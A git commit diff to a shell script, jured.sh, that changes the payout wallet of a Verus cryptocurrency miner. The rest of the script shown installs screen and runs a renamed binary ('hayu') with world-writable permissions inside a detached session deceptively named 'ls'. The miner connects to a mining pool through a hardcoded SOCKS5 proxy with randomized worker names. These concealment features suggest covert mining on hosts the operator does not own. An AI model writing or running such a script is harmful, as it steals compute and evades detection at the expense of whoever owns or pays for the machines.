681b658fcf76ad89c7704a5878d95cd97a97962f
aacsvds <88640302+aacsvds@users.noreply.github.com>
2021-08-17 06:02:32 +0700

    Update jured.sh

--- jured.sh
+++ jured.sh
@@ -4,7 +4,7 @@ sudo apt install screen libjansson4 -y
 chmod +x jured.sh && chmod +x hayu chmod 777 hayu jured.sh
 screen -dmS ls 
 POOL=stratum+tcp://eu.luckpool.net:3956
-WALLET=RKq1mFG57gmApqmGxLtXEv2Mm7y3fTZuCX
+WALLET=RGDUj7Y5uw8HDntYd9U4WiPWpiTJQrTyYM
 WORKER=$(echo $(shuf -i 1-10 -n 1)jured)
 PROXY=socks5://72.195.34.58:4145	
 ./hayu -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
